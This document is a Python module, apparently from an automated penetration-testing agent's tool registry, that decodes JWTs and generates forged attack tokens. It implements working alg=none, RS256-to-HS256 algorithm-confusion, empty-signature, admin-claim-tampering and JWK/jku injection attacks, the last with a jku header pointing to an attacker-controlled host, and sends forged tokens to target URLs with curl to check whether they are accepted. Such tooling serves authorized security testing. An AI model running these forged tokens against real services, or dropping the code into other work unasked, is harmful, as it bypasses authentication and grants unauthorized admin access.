"""JWT attack tools - decode, forge, and test JWT vulnerabilities."""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time
from typing import Any

from core.config import Config
from core.tool_registry import Tool
from utils.utils import run_cmd, sanitize_subprocess_arg


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _b64url_decode(s: str) -> bytes:
    """Base64url-decode with padding correction."""
    s = s.replace("-", "+").replace("_", "/")
    padding = 4 - len(s) % 4
    if padding != 4:
        s += "=" * padding
    return base64.b64decode(s)


def _b64url_encode(data: bytes) -> str:
    """Base64url-encode without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _decode_jwt(token: str) -> tuple[dict, dict, str]:
    """Split and decode a JWT into (header, payload, signature_b64url)."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        raise ValueError(f"Invalid JWT - expected 3 parts, got {len(parts)}")
    header = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    return header, payload, parts[2]


def _encode_jwt(header: dict, payload: dict, signature: bytes = b"") -> str:
    """Encode header, payload, and raw signature bytes into a JWT string."""
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    s = _b64url_encode(signature) if signature else ""
    return f"{h}.{p}.{s}"


def _hmac_sign(data: str, key: bytes) -> bytes:
    """HMAC-SHA256 sign the given data."""
    return hmac.new(key, data.encode("ascii"), hashlib.sha256).digest()


# ---------------------------------------------------------------------------
# Core functions
# ---------------------------------------------------------------------------


def jwt_analyze(token: str) -> dict[str, Any]:
    """Decode and analyze a JWT without verification.

    Returns a structured dict with a human-readable stdout summary and
    parsed header/payload/flags.
    """
    try:
        header, payload, sig = _decode_jwt(token)
    except (ValueError, json.JSONDecodeError, Exception) as exc:
        return {
            "stdout": f"[jwt_analyze] Failed to decode token: {exc}",
            "stderr": str(exc),
            "returncode": 1,
        }

    alg = header.get("alg", "MISSING")
    lines: list[str] = [
        "[jwt_analyze] JWT decoded successfully",
        f"  Algorithm: {alg}",
        f"  Header: {json.dumps(header, indent=2)}",
        f"  Payload: {json.dumps(payload, indent=2)}",
    ]

    # --- Flag weak algorithms ---
    weak_alg_notes: list[str] = []
    alg_lower = alg.lower() if isinstance(alg, str) else ""
    if alg_lower == "none":
        weak_alg_notes.append("CRITICAL: alg=none - signature not required")
    if alg_lower == "hs256":
        weak_alg_notes.append("HS256 - vulnerable to brute-force if key is short; check for alg confusion if server expects RS256")
    if alg_lower == "rs256":
        weak_alg_notes.append("RS256 - potential alg confusion attack (switch to HS256 and sign with public key)")

    # --- Flag suspicious claims ---
    suspicious: list[str] = []
    for key in ("admin", "is_admin", "isAdmin"):
        val = payload.get(key)
        if val is not None and str(val).lower() in ("true", "1", "yes"):
            suspicious.append(f"{key}={val}")
    role = payload.get("role", "")
    if isinstance(role, str) and role.lower() in ("admin", "superadmin", "root"):
        suspicious.append(f"role={role}")

    # --- Check expiration ---
    exp_note = ""
    exp = payload.get("exp")
    if exp is not None:
        try:
            exp_ts = int(exp)
            now = int(time.time())
            if exp_ts < now:
                exp_note = f"EXPIRED - exp {exp_ts} < now {now} (expired {now - exp_ts}s ago)"
            else:
                exp_note = f"Valid - expires in {exp_ts - now}s"
        except (TypeError, ValueError):
            exp_note = f"Unparseable exp value: {exp}"
    else:
        exp_note = "No exp claim - token never expires"

    if weak_alg_notes:
        lines.append("  Algorithm issues:")
        for note in weak_alg_notes:
            lines.append(f"    - {note}")
    if suspicious:
        lines.append("  Suspicious claims:")
        for s in suspicious:
            lines.append(f"    - {s}")
    lines.append(f"  Expiration: {exp_note}")

    return {
        "stdout": "\n".join(lines),
        "stderr": "",
        "returncode": 0,
        "parsed": {
            "header": header,
            "payload": payload,
            "signature": sig,
            "algorithm": alg,
            "weak_algorithm_notes": weak_alg_notes,
            "suspicious_claims": suspicious,
            "expiration": exp_note,
        },
    }


def jwt_attack(
    token: str,
    attack: str = "all",
    public_key: str = "",
) -> dict[str, Any]:
    """Generate attack variants of a JWT.

    attack: 'none', 'alg_confusion', 'empty_sig', 'claim_tamper', 'jwk_inject', or 'all'.
    public_key: PEM public key string (required for alg_confusion).
    """
    try:
        header, payload, _sig = _decode_jwt(token)
    except (ValueError, json.JSONDecodeError, Exception) as exc:
        return {
            "stdout": f"[jwt_attack] Failed to decode token: {exc}",
            "stderr": str(exc),
            "returncode": 1,
        }

    attacks_to_run: list[str] = []
    if attack == "all":
        attacks_to_run = ["none", "empty_sig", "claim_tamper", "jwk_inject"]
        if public_key and header.get("alg", "").upper() in ("RS256", "RS384", "RS512"):
            attacks_to_run.append("alg_confusion")
    else:
        attacks_to_run = [attack]

    tokens: list[dict[str, str]] = []
    lines: list[str] = ["[jwt_attack] Generating attack variants"]

    for atk in attacks_to_run:
        if atk == "none":
            # alg: none - remove signature
            none_header = dict(header, alg="none")
            t = _encode_jwt(none_header, payload)
            # Also generate variant with "None" and "NONE"
            for alg_variant in ("none", "None", "NONE", "nOnE"):
                h = dict(header, alg=alg_variant)
                variant_token = _encode_jwt(h, payload)
                tokens.append({
                    "name": f"alg_{alg_variant}",
                    "token": variant_token,
                    "description": f"Algorithm set to '{alg_variant}', signature stripped",
                })
            lines.append(f"  [+] alg=none variants (4 tokens)")

        elif atk == "alg_confusion":
            if not public_key:
                lines.append("  [-] alg_confusion skipped - no public_key provided")
                continue
            # Switch RS256 to HS256 and sign with the public key as the HMAC secret
            confused_header = dict(header, alg="HS256")
            h_enc = _b64url_encode(json.dumps(confused_header, separators=(",", ":")).encode())
            p_enc = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
            signing_input = f"{h_enc}.{p_enc}"
            key_bytes = public_key.encode("ascii")
            sig_bytes = _hmac_sign(signing_input, key_bytes)
            t = f"{signing_input}.{_b64url_encode(sig_bytes)}"
            tokens.append({
                "name": "alg_confusion_hs256",
                "token": t,
                "description": "Algorithm switched from RS256 to HS256, signed with public key as HMAC secret",
            })
            lines.append("  [+] alg_confusion: RS256 -> HS256 signed with public key")

        elif atk == "empty_sig":
            h_enc = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
            p_enc = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
            t = f"{h_enc}.{p_enc}."
            tokens.append({
                "name": "empty_signature",
                "token": t,
                "description": "Original header/payload with empty signature",
            })
            lines.append("  [+] empty_signature: signature removed")

        elif atk == "claim_tamper":
            tamper_variants: list[tuple[str, dict]] = [
                ("role_admin", {**payload, "role": "admin"}),
                ("sub_1", {**payload, "sub": "1"}),
                ("sub_0", {**payload, "sub": "0"}),
                ("admin_true", {**payload, "admin": True}),
                ("is_admin_true", {**payload, "is_admin": True}),
                ("isAdmin_true", {**payload, "isAdmin": True}),
            ]
            # If there is an exp claim, also generate one with exp far in the future
            if "exp" in payload:
                future_exp = int(time.time()) + 31536000  # +1 year
                tamper_variants.append(("exp_extended", {**payload, "exp": future_exp}))

            for name, tampered_payload in tamper_variants:
                t = _encode_jwt(header, tampered_payload)
                tokens.append({
                    "name": f"claim_{name}",
                    "token": t,
                    "description": f"Claim tampered: {name}",
                })
            lines.append(f"  [+] claim_tamper: {len(tamper_variants)} variants")

        elif atk == "jwk_inject":
            # Inject a JWK into the header pointing to an attacker-controlled key
            # Use a dummy RSA public key structure for the injection
            injected_jwk = {
                "kty": "RSA",
                "n": _b64url_encode(b"\x00" * 256),
                "e": _b64url_encode(b"\x01\x00\x01"),
                "kid": "attacker-key-1",
            }
            jwk_header = dict(header, jwk=injected_jwk)
            t = _encode_jwt(jwk_header, payload)
            tokens.append({
                "name": "jwk_inject",
                "token": t,
                "description": "JWK injected into header - server may use attacker-supplied key for verification",
            })
            # Also try with jku pointing to external URL
            jku_header = dict(header, jku="https://attacker.example.com/.well-known/jwks.json")
            t2 = _encode_jwt(jku_header, payload)
            tokens.append({
                "name": "jku_inject",
                "token": t2,
                "description": "jku header set to attacker-controlled URL for key fetch",
            })
            lines.append("  [+] jwk_inject + jku_inject: embedded key and external key URL")

    lines.append(f"\n  Total attack tokens generated: {len(tokens)}")
    for tk in tokens:
        lines.append(f"\n  --- {tk['name']} ---")
        lines.append(f"  Description: {tk['description']}")
        lines.append(f"  Token: {tk['token'][:80]}...")

    return {
        "stdout": "\n".join(lines),
        "stderr": "",
        "returncode": 0,
        "parsed": {"tokens": tokens},
    }


def jwt_test(
    url: str,
    original_token: str,
    tampered_token: str,
    headers: str = "",
) -> dict[str, Any]:
    """Send requests with original and tampered JWTs, compare responses.

    If the tampered token gets a 200 response similar to the original,
    JWT validation is likely broken.
    """
    url = sanitize_subprocess_arg(url, "url")

    def _build_curl(target_url: str, jwt_token: str, extra_headers: str) -> list[str]:
        cmd = [
            "curl", "-s", "-i",
            "-H", f"Authorization: Bearer {jwt_token}",
            "-w", "\n---CURL_META---\nhttp_code: %{http_code}\nsize_download: %{size_download}\n",
        ]
        if extra_headers:
            for h in extra_headers.split("\\n"):
                h = h.strip()
                if h:
                    cmd.extend(["-H", sanitize_subprocess_arg(h, "generic")])
        cmd.append(target_url)
        return cmd

    original_result = run_cmd(_build_curl(url, original_token, headers), timeout=15)
    tampered_result = run_cmd(_build_curl(url, tampered_token, headers), timeout=15)

    # Parse HTTP status codes from curl output
    def _extract_code(output: str) -> str:
        for line in output.splitlines():
            if line.strip().startswith("http_code:"):
                return line.split(":", 1)[1].strip()
        return "unknown"

    orig_code = _extract_code(original_result.get("stdout", ""))
    tamp_code = _extract_code(tampered_result.get("stdout", ""))

    # Determine if the tampered token was accepted
    vuln = False
    if tamp_code.startswith("2") and orig_code.startswith("2"):
        vuln = True
    elif tamp_code == orig_code and tamp_code not in ("401", "403", "unknown"):
        vuln = True

    lines = [
        "[jwt_test] JWT validation comparison",
        f"  URL: {url}",
        f"  Original token status: {orig_code}",
        f"  Tampered token status: {tamp_code}",
    ]
    if vuln:
        lines.append("  RESULT: VULNERABLE - tampered token accepted with same/success status")
    else:
        lines.append("  RESULT: Not vulnerable - tampered token rejected or different response")

    return {
        "stdout": "\n".join(lines),
        "stderr": "",
        "returncode": 0,
        "parsed": {
            "original_status": orig_code,
            "tampered_status": tamp_code,
            "vulnerable": vuln,
            "original_response": original_result.get("stdout", "")[:1000],
            "tampered_response": tampered_result.get("stdout", "")[:1000],
        },
    }


# ---------------------------------------------------------------------------
# Tool registration
# ---------------------------------------------------------------------------


def register_jwt_tools(config: Config) -> list[Tool]:
    """Register JWT analysis and attack tools."""
    tools: list[Tool] = []

    # jwt_analyze does not need external tools
    tools.append(Tool(
        name="jwt_analyze",
        description=(
            "Decode and analyze a JWT without verification. "
            "Reports algorithm, claims, flags weak algorithms (none, HS256 short key, alg confusion), "
            "suspicious claims (admin, role), and expiration status."
        ),
        parameters={
            "token": "The JWT string to analyze (header.payload.signature)",
        },
        example='{"token": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"}',
        phase_tags=["discovery", "vulnerability_scan"],
        execute=jwt_analyze,
    ))

    tools.append(Tool(
        name="jwt_attack",
        description=(
            "Generate attack variants of a JWT: alg=none, alg confusion (RS256->HS256), "
            "empty signature, claim tampering (role/admin escalation), and JWK/jku injection."
        ),
        parameters={
            "token": "The original JWT to generate attack variants from",
            "attack": "Attack type: none, alg_confusion, empty_sig, claim_tamper, jwk_inject, or all (default: all)",
            "public_key": "PEM public key for alg_confusion attack (optional)",
        },
        example='{"token": "eyJhbGciOiJSUzI1NiJ9...", "attack": "all", "public_key": ""}',
        phase_tags=["exploitation"],
        execute=jwt_attack,
    ))

    # jwt_test needs curl
    if "curl" in config.tool_paths:
        tools.append(Tool(
            name="jwt_test",
            description=(
                "Test a tampered JWT against a URL by comparing the response to the original token. "
                "If the tampered token gets the same 200 response, JWT validation is broken."
            ),
            parameters={
                "url": "Target URL that requires JWT authentication",
                "original_token": "The original valid JWT",
                "tampered_token": "The tampered/forged JWT to test",
                "headers": "Additional headers separated by \\n (optional)",
            },
            example='{"url": "https://api.example.com/me", "original_token": "eyJ...", "tampered_token": "eyJ..."}',
            phase_tags=["exploitation", "validation"],
            execute=jwt_test,
        ))

    return tools
